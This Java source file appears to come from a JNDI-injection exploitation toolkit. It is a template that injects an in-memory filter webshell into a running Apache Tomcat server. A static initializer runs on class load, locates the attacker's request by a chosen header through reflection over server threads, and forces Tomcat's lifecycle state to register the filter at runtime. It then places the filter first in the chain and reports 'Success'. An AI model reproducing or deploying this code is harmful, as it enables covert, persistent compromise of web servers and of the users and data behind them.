package com.qi4l.jndi.template.memshell.tomcat;

import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EnumSet;
import java.util.List;


/**
 * 遍历线程组，在 request 中查找带有特定 Header 的请求，并从 request 获取 ServletContext 添加 Filter 型内存马
 * 添加成功后，会回显 Success 字样，参考 ShiroAttack2
 */
public class TFMSFromRequestF implements Filter {
    public static HttpServletRequest request = null;

    public static HttpServletResponse response = null;

    public static String pattern;

    public static String NAME;

    public static String HEADER_KEY;

    public static String HEADER_VALUE;

    static {
        getRequestAndResponse();
        if (request != null && response != null) {
            addFilter();
        }
    }

    public static void getRequestAndResponse() {
        try {
            boolean  flag    = false;
            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

            for (int i = 0; i < threads.length; ++i) {
                Thread thread = threads[i];
                if (thread != null) {
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("http")) {
                        Object target = getFieldValue(thread, "target");
                        if (target instanceof Runnable) {
                            try {
                                target = getFieldValue(getFieldValue(getFieldValue(target, "this$0"), "handler"), "global");
                            } catch (Exception ignored) {
                                continue;
                            }

                            List processors = (List) getFieldValue(target, "processors");

                            for (int j = 0; j < processors.size(); ++j) {
                                Object processor = processors.get(j);
                                target = getFieldValue(processor, "req");
                                Object req   = target.getClass().getMethod("getNote", Integer.TYPE).invoke(target, new Integer(1));
                                String value = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, new String(HEADER_KEY));
                                if (value != null && value.contains(HEADER_VALUE)) {
                                    request = (HttpServletRequest) req;
                                    try {
                                        response = (HttpServletResponse) getFieldValue(getFieldValue(req, "request"), "response");
                                    } catch (Exception ignored) {
                                        try {
                                            response = (HttpServletResponse) req.getClass().getMethod("getResponse", (Class[]) null).invoke(req, (Object[]) null);
                                        } catch (Exception ignored2) {
                                        }
                                    }
                                    flag = true;
                                }

                                if (flag) {
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        java.lang.reflect.Field f = null;
        if (obj instanceof java.lang.reflect.Field) {
            f = (java.lang.reflect.Field) obj;
        } else {
            Class cs = obj.getClass();
            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception e) {
                    cs = cs.getSuperclass();
                }
            }
        }
        f.setAccessible(true);
        return f.get(obj);
    }


    public static void addFilter() {
        ServletContext servletContext = request.getServletContext();
        Filter         filter         = new TFMSFromRequestF();
        String         filterName     = NAME;
        String         url            = pattern;
        if (servletContext.getFilterRegistration(filterName) == null) {
            StandardContext            standardContext    = null;
            Field                      stateField         = null;
            FilterRegistration.Dynamic filterRegistration = null;

            try {
                standardContext = (StandardContext) getFieldValue(getFieldValue(servletContext, "context"), "context");
                stateField = LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, LifecycleState.STARTING_PREP);
                filterRegistration = servletContext.addFilter(filterName, filter);
                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, (Object[]) null);
                stateField.set(standardContext, LifecycleState.STARTED);

                Class filterMap;
                try {
                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception var27) {
                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                }

                Method   findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
                Object[] filterMaps     = (Object[]) ((Object[]) ((Object[]) findFilterMaps.invoke(standardContext)));

                for (int i = 0; i < filterMaps.length; ++i) {
                    Object filterMapObj = filterMaps[i];
                    findFilterMaps = filterMap.getMethod("getFilterName");
                    String name = (String) findFilterMaps.invoke(filterMapObj);
                    if (name.equalsIgnoreCase(filterName)) {
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMapObj;
                    }
                }

                writeResponse("Success");
            } catch (Exception ignored) {
            } finally {
                try {
                    stateField.set(standardContext, LifecycleState.STARTED);
                } catch (IllegalAccessException ignored) {
                }

            }
        } else {
            try {
                writeResponse("Filter already exists");
            } catch (Exception ignored) {
            }
        }
    }

    public static void writeResponse(String result) {
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding("UTF-8");
            response.setCharacterEncoding("UTF-8");
            response.getWriter().print(result);
            response.getWriter().flush();
            response.getWriter().close();
        } catch (Exception ignored) {
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
    }

    @Override
    public void destroy() {
    }
}
